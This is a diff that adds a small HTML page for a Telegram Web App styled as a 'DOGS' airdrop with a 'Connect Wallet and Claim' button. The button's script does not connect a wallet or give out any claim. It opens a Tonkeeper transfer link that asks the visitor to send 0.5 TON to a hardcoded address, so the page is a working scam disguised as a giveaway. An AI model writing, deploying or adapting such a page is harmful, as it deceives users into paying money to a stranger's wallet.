@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключить кошелек</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Стили для изображения */
+        .image {
+            width: 75%; /* Занимает всю ширину контейнера */
+            height: auto;
+            margin-bottom: 15px;
+            border-radius: 10px;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #000000;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .button-main {
+            padding: 12px 20px;
+            background-color: #ffffff;
+            color: rgb(0, 0, 0);
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        .button-main:hover {
+            background-color: #cacaca;
+        }
+
+        /* Адаптивные стили */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px; /* Уменьшаем отступы на меньших экранах */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./dogs.jpg" alt="Join DOGS" class="image">
+        <h2>Connect your wallet</h2>
+        <button class="button-main" onclick="connectWallet()">Connect Wallet and Claim</button>
+    </div>
+
+    <script>
+        function connectWallet() {
+            // Проверяем, что пользователь использует Telegram Web App
+            if (window.Telegram && window.Telegram.WebApp) {
+                Telegram.WebApp.showAlert("Connecting wallet...");
+
+                // Deeplink для открытия кошелька Tonkeeper с запросом транзакции
+                const tonAmount = 0.5;
+                const userUID = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
+                const deeplink = `https://tonkeeper.app/transfer/${userUID}?amount=${tonAmount * 1e9}`; // Конвертируем тонны в нанотонны
+
+                // Открываем ссылку для выполнения транзакции
+                window.open(deeplink, "_blank");
+            } else {
+                alert("Please use Telegram Web App to connect your wallet.");
+            }
+        }
+    </script>
+</body>
+</html>
